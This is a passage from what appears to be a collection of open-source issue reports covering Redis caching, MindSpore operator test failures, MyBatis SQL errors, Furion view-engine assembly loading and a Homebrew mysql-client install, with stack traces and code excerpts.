新增的Redis2CacheProvider hashs模式测试不通过,"@红薯   <code>: 15:03:12.974 [main] |-INFO in net.oschina.j2cache.CacheManager[43] - Using L1 CacheProvider : net.oschina.j2cache.ehcache.EhCacheProvider 15:03:13.021 [main] |-INFO in net.oschina.j2cache.CacheManager[47] - Using L2 CacheProvider : net.oschina.j2cache.redis.Redis2CacheProvider 15:03:13.022 [main] |-INFO in net.oschina.j2cache.RedisCacheChannel[59] - Connected to channel:default, time 184 ms. Exception in thread ""Thread-6"" redis.clients.jedis.exceptions.JedisConnectionException: Could not get a resource from the pool at redis.clients.util.Pool.getResource(Pool.java:50) at redis.clients.jedis.JedisPool.getResource(JedisPool.java:99) at net.oschina.j2cache.redis.RedisCacheProvider.getResource(RedisCacheProvider.java:27) at net.oschina.j2cache.RedisCacheChannel$1.run(RedisCacheChannel.java:51) at java.lang.Thread.run(Thread.java:745) Caused by: java.util.NoSuchElementException: Unable to validate object at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:506) at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:363) at redis.clients.util.Pool.getResource(Pool.java:48) ... 4 more"
Representing errors,"In old Unix world, errors are represented by a non-zero integer. In the Web world, errors are often represented by an integer and a message string. TensorFlow adopted this idea and have : Go represents an error by a string. I personally prefer Go's approach because integers are not readable and the integer-plus-string approach is redundant. What do you think, dear PaddlePaddle authors?   <code>: Status class Status { ... private: static const string&amp; empty_string(); struct State { tensorflow::error::Code code; string msg; }; // OK status has a `NULL` state_. Otherwise, `state_` points to // a `State` structure containing the error code and message(s) State* state_; ... };"
Protobuf descs should be in `framework`,", , and will be used not only by Python but also C++. They are more than a pybind interface. So they should be moved to folder.   <code>: ProgramDesc BlockDesc VarDesc OpDesc framework"
视图引擎弱类型模板不支持添加第三方程序集或者命名空间,"Furion 版本号 2.19.0 Web 项目类型 WebApi [√] Mvc Razor Pages Blazor Server MinApp 在视图弱类型模板里面引用第三方库,无论是加载程序集或者引用命名空间(Humanizer),均无效!   <code>: ?using Furion.ViewEngine; using Humanizer; using Microsoft.AspNetCore.Mvc; namespace Furion.Application { public class ViewEngineController : Controller { private readonly IViewEngine _viewEngine; public ViewEngineController(IViewEngine viewEngine) { _viewEngine = viewEngine; // var result = _viewEngine.RunCompile(""Hello @Model.Name"", new { Name = ""Furion"" }); } /// &lt;summary&gt; /// 强类型第三方程序集ok /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; public IActionResult Index() { var result = _viewEngine.RunCompileFromCached(@"" Hello @Model.Name.Camelize() @foreach(var item in Model.Items) { &lt;p&gt;@item&lt;/p&gt; } "", new TestModel { Name = ""Furion"", Items = new[] { 3, 1, 2 } }, builderAction: builder =&gt; { builder.AddAssemblyReferenceByName(""Humanizer""); // 通过名称ok builder.AddUsing(""Humanizer""); //通过using ok }); return Content(result); } /// &lt;summary&gt; /// 匿名类自带程序集测试 √ /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; public IActionResult Index1() { var result = _viewEngine.RunCompileFromCached(@""&lt;div&gt;@System.IO.Path.Combine(@Model.Name, """"ViewEngine"""")&lt;/div&gt;"", new { Name = ""Furion""}, builderAction: builder =&gt; { builder.AddAssemblyReferenceByName(""System.IO""); }); return Content(result); } /// &lt;summary&gt; /// 匿名类第三方程序集测试 × /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; public IActionResult Index2() { var result = _viewEngine.RunCompileFromCached(@""&lt;div&gt;@System.IO.Path.Combine(@Model.Name.Camelize(), """"ViewEngine"""")&lt;/div&gt;"", new { Name = ""Furion"" }, builderAction: builder =&gt; { builder.AddAssemblyReferenceByName(""System.IO""); builder.AddAssemblyReferenceByName(""Humanizer""); // 通过名称 }); return Content(result); } /// &lt;summary&gt; /// 非视图引擎测试OK /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; public IActionResult Index3() { var o = new { Name = ""Furion"" }; return Content(o.Name.Camelize()); } } public class TestModel { public string Name { get; set; } public int[] Items { get; set; } } }"
One parameter can`t be optimized by multi-optimizers,"在某些optimizer中，需要为每个parameter添加一个accumulator, 如下： 在当前optimizer的实现中（commit 99d3f089201f6967378d2d97b9f0b57ab3bc5a45），一般是固定的字符串，并且，还会check accumulator的命名是否重复, 这就导致不能为同一个parameter创建多个accumulator。 但是在某些GAN网络中，一个parameter可能需要有多个optimizer。 综上，为accumulator命名时需要加上optimizer的name.   <code>: for p in parameters: self._add_accumulator(self._velocity_acc_str, p) _velocity_acc_str"
[CT][MS][doc]constexpr op lacks blank after >>>,": GPU CPU Ascend /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_check_testcase_skip_and_plat https://www.mindspore.cn/docs/api/en/master/api_python/ops/mindspore.ops.constexpr.html?highlight=constexpr#mindspore.ops.constexpr test_check_testcase_skip_and_plat mindspore.ops.constexpr   <code>: self = &lt;doctest.DocTestParser object at 0x7fb704ce46d0&gt; lines = [' &gt;&gt;&gt;tuple_len_class()(a)'], indent = 4 name = 'mindspore.ops.primitive.constexpr', lineno = 24 def _check_prompt_blank(self, lines, indent, name, lineno): """""" Given the lines of a source string (including prompts and leading indentation), check to make sure that every prompt is followed by a space character. If any line is not followed by a space character, then raise ValueError. """""" for i, line in enumerate(lines): if len(line) &gt;= indent+4 and line[indent+3] != ' ': raise ValueError('line %r of the docstring for %s ' 'lacks blank after %s: %r' % (lineno+i+1, name, &gt; line[indent:indent+3], line)) E ValueError: line 25 of the docstring for mindspore.ops.primitive.constexpr lacks blank after &gt;&gt;&gt;: ' &gt;&gt;&gt;tuple_len_class()(a)' /root/miniconda3/envs/ci3.7/lib/python3.7/doctest.py:789: ValueError"
refine dataprovider related rst,"修改doc_cn/ui/data_provider下的文档。 @provider中的input_types，和yield返回，强调使用显示指定返回数据的对应关系。即用 代替 所有的demo都会按照这个方式进行修改，在下一个issue中完成。   <code>: @provider(input_types={'pixel': dense_vector(28 * 28), 'label': integer_value(10)}) yield {""pixel"": pixels_float, 'label': int(label)} @provider(input_types=[dense_vector(28 * 28), integer_value(10)]) yield pixels_float, int(label)"
mongodb检测有报错,"<div><div>2015-01-09 10:55:49 [INFO] check mongodb controller started. ./include/functions.py:45: Warning: Out of range value for column 'connections_available' at row 1 curs.execute(sql,param) 2015-01-09 10:55:50 [INFO] check mongodb controller finished. 解决办法调整数据库字段 ALTER TABLE . CHANGE SMALLINT(4) UNSIGNED DEFAULT 0 NOT NULL;   <code>: lepus mongodb_status connections_available connections_available"
2.6.0 启动出现  ERROR org.jim.common.utils.ImKit[136]: java.lang.NullPointerException,"调试发现：   <code>: 2019-03-29 13:05:12,991 WARN org.tio.server.AioServer[109]: null started, listen on 127.0.0.1:8888 2019-03-29 13:05:13,522 ERROR org.jim.common.utils.ImKit[136]: java.lang.NullPointerException java.lang.NullPointerException: null at org.jim.common.http.HttpProtocol.isProtocolByBuffer(HttpProtocol.java:38) at org.jim.common.protocol.AbProtocol.isProtocol(AbProtocol.java:38) at org.jim.common.utils.ImKit.protocol(ImKit.java:131) at org.jim.server.handler.ProtocolHandlerManager.initServerHandlerToChannelContext(ProtocolHandlerManager.java:60) at org.jim.server.handler.ImServerAioHandler.decode(ImServerAioHandler.java:80) at org.tio.core.task.DecodeRunnable.run(DecodeRunnable.java:110) at org.tio.core.ReadCompletionHandler.completed(ReadCompletionHandler.java:86) at org.tio.core.ReadCompletionHandler.completed(ReadCompletionHandler.java:25) at sun.nio.ch.Invoker.invokeUnchecked(Invoker.java:126) at sun.nio.ch.Invoker$2.run(Invoker.java:218) at sun.nio.ch.AsynchronousChannelGroupImpl$1.run(AsynchronousChannelGroupImpl.java:112) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)"
@TableField 注解的 update = “now()”，不起作用,"当前使用版本 3.0-RC3 @TableField 注解的 update 属性，不起作用   <code>: // 基础实体类 public class BaseDomain implements Serializable { /** * 当前页码 */ @TableField(exist = false) private int curPage = 1; /** * 每页条数 */ @TableField(exist = false) private int pgeSize = 10; // .... } // 数据库表 sys_user 对应的实体 @TableName(""sys_user"") public class SysUser extends BaseDomain { @TableId(value = ""uid"", type = IdType.AUTO) private Long uid; private String username; /** * 最近登录时间, 此处的 update = ""now()""不生效 */ @TableField(value = ""last_login"",update = ""now()"") private Date lastLogin; // getter setter } // Controller类 @Controller @RequestMapping(""/auth"") public class AuthController { // SysUserService 继承了 IService @Autowired private SysUserService sysUserService; @ResponseBody @RequestMapping(""/ajaxLogin"") public Rjson ajaxLogin(@RequestBody Map map, HttpServletResponse response){ String username = (String) map.get(""username""); // 修改用户的最后登录时间 SysUser sysUser = new SysUser(); // 此处update 报错 sysUserService.update(sysUser,new UpdateWrapper&lt;SysUser&gt;().eq(SysUser.USERNAME,username)); return Rjson.ok(""登录成功""); } } ### Error updating database. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE username = '1'' at line 1 ### The error may involve com.chilin.auth.dao.SysUserDao.update-Inline ### The error occurred while setting parameters ### SQL: UPDATE sys_user WHERE username = ? ### Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE username = '1'' at line 1 ; bad SQL grammar []; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE username = '1'' at line 1 ......"
[CT][MS][StridedSliceV2] The grad of StridedSliceV2 have accuracy error and other problem.,"The grad of StridedSliceV2 have accuracy error 部分用例反向有精度问题 有用例mindspore能过，tf有报错，需要确认一下是否要和标杆对齐 有用例mindspore正向能过，反向过不了，有两种报错 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 精度问题： mindspore能通过，标杆不能通过： 正向能过，反向报错： mindspore能通过，标杆不能通过： 反向过不了：   <code>: def test_stridedslicev2_input_6d_dtype_int32(): input_list = [] input_list.append(Tensor(np.random.randint(0, 6, size=[6, 6, 6, 6, 6, 6]).astype(np.int32))) input_list.append(Tensor(np.random.randint(0, 3, size=[6]).astype(np.int64))) input_list.append(Tensor(np.random.randint(4, 6, size=[6]).astype(np.int64))) input_list.append(Tensor(np.array([1, 1, 1, 1, 1, 1]).astype(np.int64), dtype=mstype.int64)) attrs = {""begin_mask"": 0, ""end_mask"": 0, ""ellipsis_mask"": 0, ""new_axis_mask"": 0, ""shrink_axis_mask"": 12} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_stridedslicev2_input_attr_end_new_axis_mask(): input_list = [] input_list.append(Tensor(np.random.randint( 0, 4, size=[3, 3, 3, 3]).astype(np.float32))) input_list.append( Tensor(np.array([1, 0, 1, 0]).astype(np.int32), dtype=mstype.int32)) input_list.append( Tensor(np.array([2, 2, 2, 1]).astype(np.int32), dtype=mstype.int32)) input_list.append( Tensor(np.array([1, 2, 1, 1]).astype(np.int32), dtype=mstype.int32)) attrs = {""begin_mask"": 0, ""end_mask"": 2, ""ellipsis_mask"": 0, ""new_axis_mask"": 5, ""shrink_axis_mask"": 0} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_stridedslicev2_input_4d_dtype_int8(): input_list = [] input_list.append(Tensor(np.random.randint(0, 6, size=[6, 6, 6, 6]).astype(np.int8))) input_list.append(Tensor(np.random.randint(0, 3, size=[4]).astype(np.int64))) input_list.append(Tensor(np.random.randint(4, 6, size=[4]).astype(np.int64))) input_list.append(Tensor(np.array([1, 1, 1, 1]).astype(np.int64), dtype=mstype.int64)) attrs = {""begin_mask"": 0, ""end_mask"": 0, ""ellipsis_mask"": 18, ""new_axis_mask"": 0, ""shrink_axis_mask"": 0} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() def test_stridedslicev2_input_2d_dtype_fp64(): input_list = [] input_list.append(Tensor(np.random.randn(12, 12).astype(np.float64))) input_list.append(Tensor(np.random.randint(0, 12, size=(1,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(50, 100, size=(1,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(1, 100, size=(1,)).astype(np.int64))) attrs = {""begin_mask"": 20, ""end_mask"": 0, ""ellipsis_mask"": 0, ""new_axis_mask"": 0, ""shrink_axis_mask"": 0} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_stridedslicev2_input_3d_dtype_uint16(): input_list = [] input_list.append(Tensor(np.random.randint(1, 10, size=(24, 5, 1)).astype(np.uint16))) input_list.append(Tensor(np.random.randint(0, 6, size=(3,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(0, 100, size=(3,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(0, 100, size=(3,)).astype(np.int64))) attrs = {""begin_mask"": 0, ""end_mask"": 0, ""ellipsis_mask"": 0, ""new_axis_mask"": 0, ""shrink_axis_mask"": 0} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_stridedslicev2_input_6d_dtype_int32(): input_list = [] input_list.append(Tensor(np.random.randint(0, 6, size=[6, 6, 6, 6, 6, 6]).astype(np.int32))) input_list.append(Tensor(np.random.randint(0, 3, size=[6]).astype(np.int64))) input_list.append(Tensor(np.random.randint(4, 6, size=[6]).astype(np.int64))) input_list.append(Tensor(np.array([1, 1, 1, 1, 1, 1]).astype(np.int64), dtype=mstype.int64)) attrs = {""begin_mask"": 0, ""end_mask"": 0, ""ellipsis_mask"": 0, ""new_axis_mask"": 0, ""shrink_axis_mask"": 12} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_stridedslicev2.py:239: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/stridedslicev2_ops.py:110: in grad_cmp self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]...0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]]]]], dtype=int32) data_me = array([[[[[0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]...0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]]]]], dtype=int32) rtol = 0, atol = 0 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[1 1 5 3 5 3 2 4 0 3 1 4 0 5 5 4 2 4 2 3 0 2 5 4 0 4 5 5 5 3 2 2 5 1 5 5 3 E 4 1 2 3 3] E data_me_error:[3 2 1 2 1 1 1 5 1 5 3 3 2 2 0 0 4 0 4 5 1 0 4 0 4 0 4 2 4 2 5 5 0 2 0 2 5 E 2 5 5 1 5] E loss:[2 1 4 1 4 2 1 1 1 2 2 1 2 3 5 4 2 4 2 2 1 2 1 4 4 4 1 3 1 1 3 3 5 1 5 3 2 E 2 4 3 2 2] def test_stridedslicev2_input_attr_end_new_axis_mask(): input_list = [] input_list.append(Tensor(np.random.randint( 0, 4, size=[3, 3, 3, 3]).astype(np.float32))) input_list.append( Tensor(np.array([1, 0, 1, 0]).astype(np.int32), dtype=mstype.int32)) input_list.append( Tensor(np.array([2, 2, 2, 1]).astype(np.int32), dtype=mstype.int32)) input_list.append( Tensor(np.array([1, 2, 1, 1]).astype(np.int32), dtype=mstype.int32)) attrs = {""begin_mask"": 0, ""end_mask"": 2, ""ellipsis_mask"": 0, ""new_axis_mask"": 5, ""shrink_axis_mask"": 0} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_stridedslicev2.py:826: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/stridedslicev2_ops.py:110: in grad_cmp self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[3., 2., 2.], [4., 1., 2.], [4., 5., 0.]], [[0., 0., 0.], [0., 0., 0.], [0., 0., 0.]], [[0., 0., 0.], [0., 0., 0.], [0., 0., 0.]]], dtype=float32) data_me = array([[[ 0.0000000e+00, -9.5638700e+05, 3.0901434e-41], [ 4.6242849e-44, 0.0000000e+00, -8.4255500e+05], ...000000e+00, 0.0000000e+00, 1.1350518e-43], [ 0.0000000e+00, 4.8202373e-20, 4.5843479e-41]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[3. 2. 2. 4. 1. 2. 4. 5. 0. 0. 0. 0. 0. 0. 0. 0. 0.] E data_me_error:[ 0.000000e+00 -9.563870e+05 3.090143e-41 4.624285e-44 0.000000e+00 E -8.425550e+05 3.090143e-41 -5.390936e-02 2.000000e+00 3.000000e+00 E 1.000000e+00 5.000000e+00 5.000000e+00 4.000000e+00 2.000000e+00 E 2.000000e+00 5.000000e+00] E loss:[3.0000000e+00 9.5638900e+05 2.0000000e+00 4.0000000e+00 1.0000000e+00 E 8.4255700e+05 4.0000000e+00 5.0539093e+00 2.0000000e+00 3.0000000e+00 E 1.0000000e+00 5.0000000e+00 5.0000000e+00 4.0000000e+00 2.0000000e+00 E 2.0000000e+00 5.0000000e+00] E tensorflow.python.framework.errors_impl.InvalidArgumentError: Multiple ellipses in slice spec not allowed for '{{node StridedSlice}} = StridedSlice[Index=DT_INT64, T=DT_INT8, begin_mask=0, ellipsis_mask=18, end_mask=0, new_axis_mask=0, shrink_axis_mask=0](StridedSlice/input, StridedSlice/begin, StridedSlice/end, StridedSlice/strides)' with input shapes: [6,6,6,6], [4], [4], [4] and with computed input tensors: input[3] = &lt;1 1 1 1&gt;. def test_stridedslicev2_input_2d_dtype_fp64(): input_list = [] input_list.append(Tensor(np.random.randn(12, 12).astype(np.float64))) input_list.append(Tensor(np.random.randint(0, 12, size=(1,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(50, 100, size=(1,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(1, 100, size=(1,)).astype(np.int64))) attrs = {""begin_mask"": 20, ""end_mask"": 0, ""ellipsis_mask"": 0, ""new_axis_mask"": 0, ""shrink_axis_mask"": 0} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_stridedslicev2.py:123: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/stridedslicev2_ops.py:106: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/stridedslicev2_ops.py:80: in grad_mindspore_impl Tensor(self.out_grad_np)) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:574: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:980: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/common/api.py:1177: in __call__ return self.run(obj, *args, phase=phase) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/common/api.py:1214: in run return self._exec_pip(obj, *args, phase=phase_real) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f11986a9610&gt;, obj = GradOfAllInputs&lt; (network): WrapOp&lt;&gt; &gt; phase = 'train.1661410492599766016.139707720650576.1' args = (Tensor(shape=[12, 12], dtype=Float64, value= [[ 5.37731128e-01, 3.45334244e-01, -1.15274181e+00 ... -8.75049570e-01,...4, value= [[ 1.00000000e+00, 2.00000000e+00, 2.00000000e+00 ... 0.00000000e+00, 2.00000000e+00, 5.00000000e+00]])) fn = &lt;bound method _Grad.construct of GradOfAllInputs&lt; (network): WrapOp&lt;&gt; &gt;&gt; @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct obj.__parse_method__ = fn.__name__ &gt; return self._graph_executor(args, phase) E RuntimeError: For 'StridedSliceV2Grad, elements in 'stride' can not be 0, but got 0 in dimension 1 E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/cpu/kernel/strided_slice_v2_grad_cpu_kernel.cc:655 FormatArgs /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/common/api.py:1196: RuntimeError def test_stridedslicev2_input_3d_dtype_uint16(): input_list = [] input_list.append(Tensor(np.random.randint(1, 10, size=(24, 5, 1)).astype(np.uint16))) input_list.append(Tensor(np.random.randint(0, 6, size=(3,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(0, 100, size=(3,)).astype(np.int64))) input_list.append(Tensor(np.random.randint(0, 100, size=(3,)).astype(np.int64))) attrs = {""begin_mask"": 0, ""end_mask"": 0, ""ellipsis_mask"": 0, ""new_axis_mask"": 0, ""shrink_axis_mask"": 0} fact = StridedSliceV2Mock(attrs=attrs, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_stridedslicev2.py:348: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/stridedslicev2_ops.py:106: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/stridedslicev2_ops.py:80: in grad_mindspore_impl Tensor(self.out_grad_np)) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/common/tensor.py:131: in __init__ _check_tensor_input(input_data, dtype, shape, init) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ input_data = array([], shape=(1, 1, 0), dtype=uint16), dtype = None, shape = None, init = None def _check_tensor_input(input_data=None, dtype=None, shape=None, init=None): """"""Check the tensor input."""""" if input_data is not None and shape is not None: raise ValueError(""If input_data is available, shape doesn't need to be set"") if init is not None and (shape is None or dtype is None): raise ValueError(""init, dtype and shape must have values at the same time."") if input_data is not None: if isinstance(input_data, np.ndarray) and input_data.ndim &gt; 1 and input_data.size == 0: &gt; raise ValueError(""input_data can not contain zero dimension."") E ValueError: input_data can not contain zero dimension."
table设size='sm'时，单元格中加入的开关无法适应外部样式，导致显示不完整,"当table渲染时设size='sm'时，单元格中加入的开关无法适应外部样式，导致显示不完整 建议添加类似或者为input添加关于的样式选择。同时，理论上也应该具有的选择以匹配大尺寸表格的样式。 最后，感谢你与你的团队对开源框架的付出。   <code>: lay-skin=""switch-sm"" lay-size=""sm"" lay-size=""lg"" layui"
example查询的order by问题,"一个很简单的查询： 拼出来的SQL，后面带了orderBy这个实体的地址，不知道为什么要解析orderby 我看了源码感觉可能是判断是否有orderby的问题，实际上我根本没有配置order by语句，但是还是打印出来了这样的语句.错误和源码地址如下： 见SqlHelper类514行： 3.3.7中加上order by的api查询仍报此错误 我的环境如下： spring 4.2.6 mybatis 3.4.1 mybatis-spring 1.3.0 mapper 3.3.7   <code>: Example example = new Example(City.class); example.createCriteria().andEqualTo(""state"", ""河北""); List&lt;City&gt; list = mapper.selectByExample(example); ### SQL: SELECT Id, name, state FROM city WHERE (state = ?) order by tk.mybatis.mapper.entity.Example$OrderBy@603256ca Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server /** * example查询中的orderBy条件，会判断默认orderBy * * @return */ public static String exampleOrderBy(Class&lt;?&gt; entityClass) { StringBuilder sql = new StringBuilder(); sql.append(""&lt;if test=\""orderByClause != null\""&gt;""); sql.append(""order by ${orderByClause}""); sql.append(""&lt;/if&gt;""); String orderByClause = EntityHelper.getOrderByClause(entityClass); if (orderByClause.length() &gt; 0) { sql.append(""&lt;if test=\""orderByClause == null\""&gt;""); sql.append(""ORDER BY "" + orderByClause); sql.append(""&lt;/if&gt;""); } return sql.toString(); } @Test public void testSelectByExp(){ Example example = new Example(City.class); example.createCriteria().andEqualTo(""state"", ""河北""); ** example.orderBy(""state"");** List&lt;City&gt; list = mapper.selectByExample(example); System.out.println(list.size()); }"
安装mysql-client报错，fatal: not in a git directory Error: Command failed with exit 128: git,"环境：mac m1 安装mysql-client报错 Steps to reproduce brew install mysql-client Error information   <code>: Warning: No remote 'origin' in /opt/homebrew/Library/Taps/homebrew/homebrew-cask, skipping update! Warning: No remote 'origin' in /opt/homebrew/Library/Taps/homebrew/homebrew-core, skipping update! Warning: No remote 'origin' in /opt/homebrew/Library/Taps/homebrew/homebrew-services, skipping update! ==&gt; Downloading https://mirrors.ustc.edu.cn/homebrew-bottles/ca-certificates-2022-04-26.all.bottle.tar.gz Already downloaded: /Users/yuting/Library/Caches/Homebrew/downloads/4f91ccc3b48ccc78bee87e4d4e3d9bb90e5b2f512d7ce8eb85f62d903251ffd7--ca-certificates-2022-04-26.all.bottle.tar.gz ==&gt; Downloading https://mirrors.ustc.edu.cn/homebrew-bottles/openssl%401.1-1.1.1o.arm64_monterey.bottle.tar.gz Already downloaded: /Users/yuting/Library/Caches/Homebrew/downloads/f89d7ee99de9e38d5041b111da2615a86a85d5125ab38ca380548be6900d67ce--openssl@1.1-1.1.1o.arm64_monterey.bottle.tar.gz ==&gt; Downloading https://mirrors.ustc.edu.cn/homebrew-bottles/libevent-2.1.12.arm64_monterey.bottle.tar.gz Already downloaded: /Users/yuting/Library/Caches/Homebrew/downloads/40a162c44a35f9684952722283e97d5f5abf384b9c36c3d2e6d1b5eba4760d5d--libevent-2.1.12.arm64_monterey.bottle.tar.gz ==&gt; Downloading https://mirrors.ustc.edu.cn/homebrew-bottles/libcbor-0.9.0.arm64_monterey.bottle.tar.gz Already downloaded: /Users/yuting/Library/Caches/Homebrew/downloads/3c97c4c3988c9af1fb7b0e2dec19889b11a21d7bd5548731614e09da1bc55bc8--libcbor-0.9.0.arm64_monterey.bottle.tar.gz ==&gt; Downloading 